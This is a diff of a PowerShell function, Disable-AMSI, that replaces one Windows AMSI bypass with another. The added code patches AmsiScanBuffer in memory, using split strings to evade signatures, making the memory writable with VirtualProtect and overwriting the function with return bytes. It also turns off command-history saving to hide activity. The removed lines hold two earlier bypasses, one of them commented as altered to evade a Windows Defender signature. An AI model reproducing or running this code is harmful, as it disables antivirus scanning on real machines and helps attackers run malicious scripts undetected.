@@ -1,53 +1,32 @@
 function Disable-AMSI
 {
-    Set-PSReadlineOption -HistorySaveStyle SaveNothing
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
 
-$AMSIBypass2=@"
+$AMSIBypass=@"
 using System;
 using System.Runtime.InteropServices;
 
-namespace RandomNamespace
-{
-    public class RandomClass
-    {
-        [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        [DllImport("kernel32")]
-        public static extern IntPtr LoadLibrary(string name);
-        [DllImport("kernel32")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+public class foo {
 
-        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
-        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
-        public static void RandomFunction()
-        {
-            IntPtr TargetDLL = LoadLibrary("amsi.dll");
-            IntPtr TotallyNotThatBufferYouRLookingForPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
 
-            UIntPtr dwSize = (UIntPtr)5;
-            uint Zero = 0;
-         
-            VirtualProtect(TotallyNotThatBufferYouRLookingForPtr, dwSize, 0x40, out Zero);
-            Byte[] one = { 0x31 };
-            Byte[] two = { 0xff, 0x90 };
-            int length = one.Length + two.Length;
-            byte[] sum = new byte[length];
-            one.CopyTo(sum,0);
-            two.CopyTo(sum,one.Length);
-            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
-             Marshal.Copy(sum, 0, unmanagedPointer, 3);
-             MoveMemory(TotallyNotThatBufferYouRLookingForPtr + 0x001b, unmanagedPointer, 3);
-        }
-    }
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
 }
 "@
 
-#AMSI Bypass 1, by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
-(([Ref].Assembly.gettypes() | where {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
+Add-Type $AMSIBypass
 
-#AMSI Bypass 2
-Add-Type -TypeDefinition $AMSIBypass2
-[RandomNamespace.RandomClass]::RandomFunction()
+$l = [foo]::LoadLibrary("am" + "si.dll")
+$a = [foo]::GetProcAddress($l, "Amsi" + "Scan" + "Buffer")
+$p = 0
+$null = [foo]::VirtualProtect($a, [uint32]5, 0x40, [ref]$p)
+$pa = [Byte[]] (184, 87, 0, 7, 128, 195)
+[System.Runtime.InteropServices.Marshal]::Copy($pa, 0, $a, 6)
 
 }
